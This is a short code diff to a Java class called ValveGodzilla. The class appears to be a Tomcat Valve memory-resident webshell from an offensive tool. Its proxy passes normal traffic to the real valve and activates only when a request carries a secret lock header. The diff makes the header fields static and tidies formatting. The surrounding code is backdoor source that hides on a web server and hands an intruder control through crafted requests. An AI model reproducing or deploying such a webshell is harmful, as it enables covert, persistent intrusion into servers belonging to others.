@@ -22,8 +22,8 @@ public class ValveGodzilla implements InvocationHandler {
     public static String md5 = md5(pass + key);
     private Object targetObject;
     private Object next;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public ValveGodzilla(Object targetObject) {
         this.targetObject = targetObject;
@@ -36,7 +36,7 @@ public class ValveGodzilla implements InvocationHandler {
             return next;
         } else if (method.getName().equals("setNext")) {
             next = args[0];
-        } else{
+        } else {
             return method.invoke(getFieldValue(targetObject, "basic"), args);
         }
         return null;
@@ -45,7 +45,7 @@ public class ValveGodzilla implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
